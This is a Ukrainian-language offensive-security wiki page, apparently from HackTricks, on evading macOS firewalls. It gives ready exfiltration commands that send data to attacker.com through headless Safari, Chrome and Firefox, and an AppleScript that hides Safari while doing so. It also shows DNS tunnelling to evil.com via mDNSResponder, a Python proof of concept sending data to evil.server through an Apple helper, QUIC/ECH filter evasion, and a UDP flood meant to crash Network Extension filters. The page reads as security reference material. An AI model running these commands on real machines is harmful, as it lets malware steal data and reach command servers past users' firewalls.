# Обхід брандмауерів macOS

{{#include ../../banners/hacktricks-training.md}}

## Виявлені техніки

Наведені нижче техніки працювали в деяких застосунках брандмауерів macOS.

### Зловживання назвами з білого списку

- Наприклад, називати malware іменами добре відомих процесів macOS, як-от **`launchd`**

### Synthetic Click

- Якщо брандмауер запитує в користувача дозвіл, змусити malware **натиснути allow**

### **Використання підписаних Apple бінарних файлів**

- Наприклад, **`curl`**, а також інших, як-от **`whois`**

### Добре відомі домени Apple

Брандмауер може дозволяти підключення до добре відомих доменів Apple, таких як **`apple.com`** або **`icloud.com`**. А iCloud можна використовувати як C2.

### Загальний обхід

Деякі ідеї для спроби обійти брандмауери

### Перевірка дозволеного трафіку

Знання дозволеного трафіку допоможе визначити потенційно додані до білого списку домени або те, яким застосункам дозволено отримувати до них доступ
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

У macOS процес **не** взаємодіє із DNS-сервером безпосередньо. Розв'язання імен через **XPC** здійснює **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) — системний daemon, підписаний Apple, тому кожен lookup на машині залишає host як трафік **від `mDNSResponder`**, а не від процесу, якому він був потрібен. Тому firewalls зазвичай безумовно довіряють цьому daemon — його блокування порушило б розв'язання імен для всієї системи.<sup>[1]</sup>

Це робить DNS каналом, який залишається відкритим, навіть коли firewall блокує власні sockets malware:<sup>[1]</sup>

1. Malware намагається підключитися до `evil.com`. Його **власне** outbound-підключення перевіряє firewall і **блокує**.
2. Натомість malware просить `mDNSResponder` **розв'язати** `evil.com` через XPC.
3. Firewall перевіряє отриманий query, бачить довірений resolver, підписаний Apple, як originator і **дозволяє його**.
4. Query досягає DNS-сервера — і якщо attacker керує authoritative-сервером для `evil.com`, він контролює обидва кінці обміну.

Оскільки attacker володіє цією zone, жодне «підключення» не потрібне: дані виводяться всередині **запитуваних labels** (наприклад, `<encoded-chunk>.evil.com`), а commands повертаються всередині **answer records** (TXT, A, CNAME…), що є класичним DNS tunnelling через повністю whitelisted process.

Будь-який unprivileged process може безпосередньо керувати daemon — це простий спосіб підтвердити, що цей path відкритий:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Через Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Через ін'єкції у процеси

Якщо ви можете **ін'єктувати код у процес**, якому дозволено підключатися до будь-якого сервера, ви можете обійти захист firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Нещодавні вразливості обходу firewall у macOS (2023-2025)

### Обхід фільтра вебвмісту (Screen Time) — **CVE-2024-44206**
У липні 2024 року Apple виправила критичну помилку в Safari/WebKit, яка порушувала роботу загальносистемного «фільтра вебвмісту», що використовується батьківським контролем Screen Time.
Спеціально сформований URI (наприклад, із подвійним URL-кодуванням «://») не розпізнається ACL Screen Time, але приймається WebKit, тому запит надсилається без фільтрації. Отже, будь-який процес, який може відкрити URL (зокрема sandboxed або unsigned code), може отримати доступ до доменів, які явно заблоковані користувачем або профілем MDM.<sup>[2]</sup>

Практичний тест (у системі без встановленого виправлення):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Помилка впорядкування правил Packet Filter (PF) у ранній версії macOS 14 “Sonoma”
Під час beta-циклу macOS 14 Apple внесла регресію в userspace-обгортку навколо **`pfctl`**.
Правила, додані з ключовим словом `quick` (яке використовують багато VPN kill-switches), мовчки ігнорувалися, спричиняючи витоки трафіку, навіть коли VPN/firewall GUI показував *blocked*. Помилку підтвердили кілька VPN-вендорів, і її було виправлено в RC 2 (build 23A344).

Швидка leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Використання Apple-signed helper services (legacy – до macOS 11.2)
До macOS 11.2 **`ContentFilterExclusionList`** дозволяв приблизно 50 бінарним файлам Apple, зокрема **`nsurlsessiond`** і App Store, обходити всі socket-filter firewalls, реалізовані за допомогою Network Extension framework (LuLu, Little Snitch тощо).
Malware міг просто запустити виключений процес або інжектити в нього код і тунелювати власний трафік через уже дозволений socket. Apple повністю видалила список виключень у macOS 11.2, але ця техніка все ще актуальна для систем, які неможливо оновити.<sup>[3]</sup>

Приклад proof-of-concept (до 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH для обходу domain filters Network Extension (macOS 12+)
NEFilter Packet/Data Providers орієнтуються на TLS ClientHello SNI/ALPN. За використання **HTTP/3 через QUIC (UDP/443)** і **Encrypted Client Hello (ECH)** SNI залишається зашифрованим, NetExt не може проаналізувати flow, а правила для hostname часто працюють у режимі fail-open, дозволяючи malware підключатися до заблокованих доменів без звернення до DNS.<sup>[5]</sup>

Мінімальний PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Якщо QUIC/ECH усе ще увімкнено, це простий шлях обходу фільтрації за hostname.

### Нестабільність Network Extension у macOS 15 “Sequoia” (2024–2025)
Ранні збірки 15.0/15.1 призводять до аварійного завершення роботи сторонніх фільтрів **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne тощо). Коли фільтр перезапускається, macOS видаляє його правила для flow, а багато продуктів переходять у режим fail-open. Flooding фільтра тисячами коротких UDP flows (або примусове використання QUIC/ECH) може повторно спричиняти аварійне завершення роботи й залишати вікно для C2/exfil, хоча GUI усе ще стверджує, що firewall працює.<sup>[4]</sup>

Швидке відтворення (на безпечній лабораторній машині):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Поради щодо інструментів для сучасної macOS

1. Перевірте поточні правила PF, які генерують GUI-файрволи:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Перелічіть бінарні файли, які вже мають entitlement *outgoing-network* (корисно для piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Програмно зареєструйте власний фільтр вмісту Network Extension мовами Objective-C/Swift.
Мінімальний rootless PoC, який пересилає пакети до локального сокета, доступний у вихідному коді **LuLu** від Patrick Wardle.

## Посилання

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Створення та злам файрволів macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Обхід вебфільтра вмісту Apple забезпечує необмежений доступ до заблокованого вмісту (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple вилучила функцію macOS, яка дозволяла застосункам обходити захист файрвола - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Продукти кібербезпеки перестають працювати після оновлення macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Використовуйте захист мережі, щоб запобігати підключенням macOS до небезпечних сайтів - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
